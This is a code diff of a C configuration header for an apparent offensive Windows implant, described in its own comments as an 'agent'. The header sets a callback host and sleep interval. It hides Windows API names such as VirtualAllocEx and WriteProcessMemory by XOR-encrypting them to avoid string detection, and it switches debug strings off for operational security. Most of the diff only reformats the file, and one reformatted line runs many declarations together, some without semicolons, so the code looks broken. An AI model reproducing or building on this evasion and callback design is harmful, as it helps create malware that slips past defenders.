@@ -2,7 +2,6 @@
 
 #include <windows.h> //for funcs section, like BYTE def, etc.
 
-
 /*
 A set of macro settings for modifying behavior
 */
@@ -37,7 +36,6 @@ A set of macro settings for modifying behavior
 // Sleep time (seconds)
 #define CALLBACK_SLEEP_TIME 60
 #endif
-
 
 #ifndef CALLBACK_HTTP_HOST
 // IP/Hostname of Callback.
@@ -102,7 +100,7 @@ idea:
  Ex: http://10.0.0.27:MACRO_CALLBACK_PORT/post/%s >>
 
  # xor would return a string, or whatever is needed
- xor(http://10.0.0.27:MACRO_CALLBACK_PORT/post/%s, KEY) 
+ xor(http://10.0.0.27:MACRO_CALLBACK_PORT/post/%s, KEY)
 
  //might hit some type conflicts
 
@@ -113,7 +111,7 @@ idea:
 //================
 // DEBUG
 //================
-#define DEBUG_PRINT 1 // Set to 1 for debug mode, 0 to disable
+#define DEBUG_PRINT 0 // Set to 1 for debug mode, 0 to disable
 // [OPSEC: If this is on (1), plaintext debug strings will be included in the binary]
 
 // TLDR: ChatGPT magic to make a print debug macro
@@ -122,11 +120,10 @@ idea:
 #define DEBUG_LOGW(fmt, ...) wprintf(L"[DEBUG] " fmt L"", ##__VA_ARGS__)
 #define DEBUG_LOGF(stream, fmt, ...) fprintf(stream, "[DEBUG] " fmt "", ##__VA_ARGS__)
 #else
-#define DEBUG_LOG(fmt, ...) // No-op (does nothing)
-#define DEBUG_LOGW(fmt, ...) // No-op (does nothing)
+#define DEBUG_LOG(fmt, ...)          // No-op (does nothing)
+#define DEBUG_LOGW(fmt, ...)         // No-op (does nothing)
 #define DEBUG_LOGF(stream, fmt, ...) // No-op (does nothing)
 #endif
-
 
 //================
 // FUNCS
@@ -136,7 +133,7 @@ idea:
 /*
 Encrypting function names, so they don't show up as strings in the binary.
 
-They (technically) will show up in memory, but it shouldn't be for long. Have not 
+They (technically) will show up in memory, but it shouldn't be for long. Have not
 verified/extensively tested this yet
 
 Every whisper_winapi function that dynamically resolves the function, will need
@@ -145,14 +142,14 @@ the following entries:
  - FUNC_Whisper<FUNCNAME>_ENCRYPTED_NAME: XOR'd name of the function
 
 
-NOTE!!!! YOU NEED 0x00 AS A NULL TERM AT THE END OF THE NAMES, otherwise 
+NOTE!!!! YOU NEED 0x00 AS A NULL TERM AT THE END OF THE NAMES, otherwise
 the agent will keep reading past the name of the func.
 */
 
 // ===============================
-//OPTIONAL/DEBUG hardcoded Values:
+// OPTIONAL/DEBUG hardcoded Values:
 // ===============================
-//uncomment to disable the MACRO based replacement + key
+// uncomment to disable the MACRO based replacement + key
 
 // //key for unencrypting these names
 // #define FUNC_ENCRYPTED_NAME_KEY 0x10
@@ -160,7 +157,7 @@ the agent will keep reading past the name of the func.
 // // Encrypted function name (constant array), cannot macro an array in :(
 // static const BYTE FUNC_WhisperMessageBoxA_ENCRYPTED_NAME[]  = { 0x5d, 0x75, 0x63, 0x63, 0x71, 0x77, 0x75, 0x52, 0x7f, 0x68, 0x51, 0x00 };
 // static const BYTE FUNC_WhisperCreateThread_ENCRYPTED_NAME[] = { 0x53,0x62,0x75,0x71,0x64,0x75,0x44,0x78,0x62,0x75,0x71,0x74, 0x00};
-//static const BYTE FUNC_CreateProcessA_ENCRYPTED_NAME[]       = { 0x53,0x62,0x75,0x71,0x64,0x75,0x40,0x62,0x7f,0x73,0x75,0x63,0x63,0x51 0x00}
+// static const BYTE FUNC_CreateProcessA_ENCRYPTED_NAME[]       = { 0x53,0x62,0x75,0x71,0x64,0x75,0x40,0x62,0x7f,0x73,0x75,0x63,0x63,0x51 0x00}
 // static const BYTE FUNC_ResumeThread_ENCRYPTED_NAME[]        = { 0x42,0x75,0x63,0x65,0x7d,0x75,0x44,0x78,0x62,0x75,0x71,0x74, 0x00};
 // static const BYTE FUNC_VirtualAllocEx_ENCRYPTED_NAME[]      = { 0x46,0x79,0x62,0x64,0x65,0x71,0x7c,0x51,0x7c,0x7c,0x7f,0x73,0x55,0x68, 0x00};
 // static const BYTE FUNC_WriteProcessMemory_ENCRYPTED_NAME[]  = { 0x47,0x62,0x79,0x64,0x75,0x40,0x62,0x7f,0x73,0x75,0x63,0x63,0x5d,0x75,0x7d,0x7f,0x62,0x69, 0x00};
@@ -183,60 +180,38 @@ the agent will keep reading past the name of the func.
 // BUILD SYSTEM macro Values:
 // Uncomment to enable build system XOR replacement
 // ===============================
-//key for unencrypting these names
+// key for unencrypting these names
 #define FUNC_ENCRYPTED_NAME_KEY MACRO_FUNC_ENCRYPTED_NAME_KEY
-//constants for each entry, XOR'd function names
-static const BYTE FUNC_MessageBoxA_ENCRYPTED_NAME[]         = MACRO_FUNC_MessageBoxA_ENCRYPTED_NAME
-static const BYTE FUNC_CreateThread_ENCRYPTED_NAME[]        = MACRO_FUNC_CreateThread_ENCRYPTED_NAME
-static const BYTE FUNC_CreateProcessA_ENCRYPTED_NAME[]      = MACRO_FUNC_CreateProcessA_ENCRYPTED_NAME
-static const BYTE FUNC_ResumeThread_ENCRYPTED_NAME[]        = MACRO_FUNC_ResumeThread_ENCRYPTED_NAME
-static const BYTE FUNC_VirtualAllocEx_ENCRYPTED_NAME[]      = MACRO_FUNC_VirtualAllocEx_ENCRYPTED_NAME
-static const BYTE FUNC_WriteProcessMemory_ENCRYPTED_NAME[]  = MACRO_FUNC_WriteProcessMemory_ENCRYPTED_NAME
-static const BYTE FUNC_CreatePipe_ENCRYPTED_NAME[]          = MACRO_FUNC_CreatePipe_ENCRYPTED_NAME
-static const BYTE FUNC_SetHandleInformation_ENCRYPTED_NAME[]= MACRO_FUNC_SetHandleInformation_ENCRYPTED_NAME
-static const BYTE FUNC_CloseHandle_ENCRYPTED_NAME[]         = MACRO_FUNC_CloseHandle_ENCRYPTED_NAME
-static const BYTE FUNC_InternetOpenA_ENCRYPTED_NAME[]       = MACRO_FUNC_InternetOpenA_ENCRYPTED_NAME
-static const BYTE FUNC_InternetConnectA_ENCRYPTED_NAME[]    = MACRO_FUNC_InternetConnectA_ENCRYPTED_NAME
-static const BYTE FUNC_HttpOpenRequestA_ENCRYPTED_NAME[]    = MACRO_FUNC_HttpOpenRequestA_ENCRYPTED_NAME
-static const BYTE FUNC_HttpSendRequestA_ENCRYPTED_NAME[]    = MACRO_FUNC_HttpSendRequestA_ENCRYPTED_NAME
-static const BYTE FUNC_InternetOpenUrlW_ENCRYPTED_NAME[]    = MACRO_FUNC_InternetOpenUrlW_ENCRYPTED_NAME
-static const BYTE FUNC_InternetReadFile_ENCRYPTED_NAME[]    = MACRO_FUNC_InternetReadFile_ENCRYPTED_NAME
-static const BYTE FUNC_InternetCloseHandle_ENCRYPTED_NAME[] = MACRO_FUNC_InternetCloseHandle_ENCRYPTED_NAME
-static const BYTE FUNC_GetUserNameW_ENCRYPTED_NAME[]        = MACRO_FUNC_GetUserNameW_ENCRYPTED_NAME
-static const BYTE FUNC_Sleep_ENCRYPTED_NAME[]               = MACRO_FUNC_Sleep_ENCRYPTED_NAME
-static const BYTE FUNC_WaitForSingleObject_ENCRYPTED_NAME[] = MACRO_FUNC_WaitForSingleObject_ENCRYPTED_NAME
-static const BYTE FUNC_ReadFile_ENCRYPTED_NAME[]            = MACRO_FUNC_ReadFile_ENCRYPTED_NAME
-static const BYTE FUNC_OpenProcess_ENCRYPTED_NAME[]         = MACRO_FUNC_OpenProcess_ENCRYPTED_NAME;
-static const BYTE FUNC_TerminateProcess_ENCRYPTED_NAME[]    = MACRO_FUNC_TerminateProcess_ENCRYPTED_NAME;
-static const BYTE FUNC_SuspendThread_ENCRYPTED_NAME[]       = MACRO_FUNC_SuspendThread_ENCRYPTED_NAME;
-static const BYTE FUNC_FormatMessageA_ENCRYPTED_NAME[]      = MACRO_FUNC_FormatMessageA_ENCRYPTED_NAME;
+// constants for each entry, XOR'd function names
+static const BYTE FUNC_MessageBoxA_ENCRYPTED_NAME[] = MACRO_FUNC_MessageBoxA_ENCRYPTED_NAME static const BYTE FUNC_CreateThread_ENCRYPTED_NAME[] = MACRO_FUNC_CreateThread_ENCRYPTED_NAME static const BYTE FUNC_CreateProcessA_ENCRYPTED_NAME[] = MACRO_FUNC_CreateProcessA_ENCRYPTED_NAME static const BYTE FUNC_ResumeThread_ENCRYPTED_NAME[] = MACRO_FUNC_ResumeThread_ENCRYPTED_NAME static const BYTE FUNC_VirtualAllocEx_ENCRYPTED_NAME[] = MACRO_FUNC_VirtualAllocEx_ENCRYPTED_NAME static const BYTE FUNC_WriteProcessMemory_ENCRYPTED_NAME[] = MACRO_FUNC_WriteProcessMemory_ENCRYPTED_NAME static const BYTE FUNC_CreatePipe_ENCRYPTED_NAME[] = MACRO_FUNC_CreatePipe_ENCRYPTED_NAME static const BYTE FUNC_SetHandleInformation_ENCRYPTED_NAME[] = MACRO_FUNC_SetHandleInformation_ENCRYPTED_NAME static const BYTE FUNC_CloseHandle_ENCRYPTED_NAME[] = MACRO_FUNC_CloseHandle_ENCRYPTED_NAME static const BYTE FUNC_InternetOpenA_ENCRYPTED_NAME[] = MACRO_FUNC_InternetOpenA_ENCRYPTED_NAME static const BYTE FUNC_InternetConnectA_ENCRYPTED_NAME[] = MACRO_FUNC_InternetConnectA_ENCRYPTED_NAME static const BYTE FUNC_HttpOpenRequestA_ENCRYPTED_NAME[] = MACRO_FUNC_HttpOpenRequestA_ENCRYPTED_NAME static const BYTE FUNC_HttpSendRequestA_ENCRYPTED_NAME[] = MACRO_FUNC_HttpSendRequestA_ENCRYPTED_NAME static const BYTE FUNC_InternetOpenUrlW_ENCRYPTED_NAME[] = MACRO_FUNC_InternetOpenUrlW_ENCRYPTED_NAME static const BYTE FUNC_InternetReadFile_ENCRYPTED_NAME[] = MACRO_FUNC_InternetReadFile_ENCRYPTED_NAME static const BYTE FUNC_InternetCloseHandle_ENCRYPTED_NAME[] = MACRO_FUNC_InternetCloseHandle_ENCRYPTED_NAME static const BYTE FUNC_GetUserNameW_ENCRYPTED_NAME[] = MACRO_FUNC_GetUserNameW_ENCRYPTED_NAME static const BYTE FUNC_Sleep_ENCRYPTED_NAME[] = MACRO_FUNC_Sleep_ENCRYPTED_NAME static const BYTE FUNC_WaitForSingleObject_ENCRYPTED_NAME[] = MACRO_FUNC_WaitForSingleObject_ENCRYPTED_NAME static const BYTE FUNC_ReadFile_ENCRYPTED_NAME[] = MACRO_FUNC_ReadFile_ENCRYPTED_NAME static const BYTE FUNC_OpenProcess_ENCRYPTED_NAME[] = MACRO_FUNC_OpenProcess_ENCRYPTED_NAME;
+static const BYTE FUNC_TerminateProcess_ENCRYPTED_NAME[] = MACRO_FUNC_TerminateProcess_ENCRYPTED_NAME;
+static const BYTE FUNC_SuspendThread_ENCRYPTED_NAME[] = MACRO_FUNC_SuspendThread_ENCRYPTED_NAME;
+static const BYTE FUNC_FormatMessageA_ENCRYPTED_NAME[] = MACRO_FUNC_FormatMessageA_ENCRYPTED_NAME;
 static const BYTE FUNC_CreateToolhelp32Snapshot_ENCRYPTED_NAME[] = MACRO_FUNC_CreateToolhelp32Snapshot_ENCRYPTED_NAME;
-static const BYTE FUNC_Process32First_ENCRYPTED_NAME[]      = MACRO_FUNC_Process32First_ENCRYPTED_NAME;
-static const BYTE FUNC_Process32Next_ENCRYPTED_NAME[]       = MACRO_FUNC_Process32Next_ENCRYPTED_NAME;
-static const BYTE FUNC_GetFileSize_ENCRYPTED_NAME[]         = MACRO_FUNC_GetFileSize_ENCRYPTED_NAME;
-static const BYTE FUNC_DeleteFileA_ENCRYPTED_NAME[]         = MACRO_FUNC_DeleteFileA_ENCRYPTED_NAME;
-static const BYTE FUNC_WriteFile_ENCRYPTED_NAME[]           = MACRO_FUNC_WriteFile_ENCRYPTED_NAME;
-static const BYTE FUNC_MoveFileA_ENCRYPTED_NAME[]           = MACRO_FUNC_MoveFileA_ENCRYPTED_NAME;
-static const BYTE FUNC_CopyFileA_ENCRYPTED_NAME[]           = MACRO_FUNC_CopyFileA_ENCRYPTED_NAME;
-static const BYTE FUNC_FindFirstFileW_ENCRYPTED_NAME[]      = MACRO_FUNC_FindFirstFileW_ENCRYPTED_NAME;
-static const BYTE FUNC_FindNextFileW_ENCRYPTED_NAME[]       = MACRO_FUNC_FindNextFileW_ENCRYPTED_NAME;
-static const BYTE FUNC_FindClose_ENCRYPTED_NAME[]           = MACRO_FUNC_FindClose_ENCRYPTED_NAME;
-static const BYTE FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME[]= MACRO_FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME;
-static const BYTE FUNC_CreateDirectoryA_ENCRYPTED_NAME[]    = MACRO_FUNC_CreateDirectoryA_ENCRYPTED_NAME;
-static const BYTE FUNC_RemoveDirectoryA_ENCRYPTED_NAME[]    = MACRO_FUNC_RemoveDirectoryA_ENCRYPTED_NAME;
-static const BYTE FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME[]= MACRO_FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME;
-static const BYTE FUNC_CreateFileA_ENCRYPTED_NAME[]         = MACRO_FUNC_CreateFileA_ENCRYPTED_NAME;
-
-
+static const BYTE FUNC_Process32First_ENCRYPTED_NAME[] = MACRO_FUNC_Process32First_ENCRYPTED_NAME;
+static const BYTE FUNC_Process32Next_ENCRYPTED_NAME[] = MACRO_FUNC_Process32Next_ENCRYPTED_NAME;
+static const BYTE FUNC_GetFileSize_ENCRYPTED_NAME[] = MACRO_FUNC_GetFileSize_ENCRYPTED_NAME;
+static const BYTE FUNC_DeleteFileA_ENCRYPTED_NAME[] = MACRO_FUNC_DeleteFileA_ENCRYPTED_NAME;
+static const BYTE FUNC_WriteFile_ENCRYPTED_NAME[] = MACRO_FUNC_WriteFile_ENCRYPTED_NAME;
+static const BYTE FUNC_MoveFileA_ENCRYPTED_NAME[] = MACRO_FUNC_MoveFileA_ENCRYPTED_NAME;
+static const BYTE FUNC_CopyFileA_ENCRYPTED_NAME[] = MACRO_FUNC_CopyFileA_ENCRYPTED_NAME;
+static const BYTE FUNC_FindFirstFileW_ENCRYPTED_NAME[] = MACRO_FUNC_FindFirstFileW_ENCRYPTED_NAME;
+static const BYTE FUNC_FindNextFileW_ENCRYPTED_NAME[] = MACRO_FUNC_FindNextFileW_ENCRYPTED_NAME;
+static const BYTE FUNC_FindClose_ENCRYPTED_NAME[] = MACRO_FUNC_FindClose_ENCRYPTED_NAME;
+static const BYTE FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME[] = MACRO_FUNC_SetCurrentDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_CreateDirectoryA_ENCRYPTED_NAME[] = MACRO_FUNC_CreateDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_RemoveDirectoryA_ENCRYPTED_NAME[] = MACRO_FUNC_RemoveDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME[] = MACRO_FUNC_GetCurrentDirectoryA_ENCRYPTED_NAME;
+static const BYTE FUNC_CreateFileA_ENCRYPTED_NAME[] = MACRO_FUNC_CreateFileA_ENCRYPTED_NAME;
 
 /*
 Note on .dll's, they can be XOR'd but you have to convert them to WCHAR cuz REsolveFunctin takes that
 
-Kernel32.dll is common enough that it's fine being unencryped, others might 
-benefit from it. 
+Kernel32.dll is common enough that it's fine being unencryped, others might
+benefit from it.
 
 I'm leaving it for now, so kernel32.dll/others, will show up in strings
 
 */
 
-#endif //ENCRYPTION_FUNCTION_NAMES
+#endif // ENCRYPTION_FUNCTION_NAMES
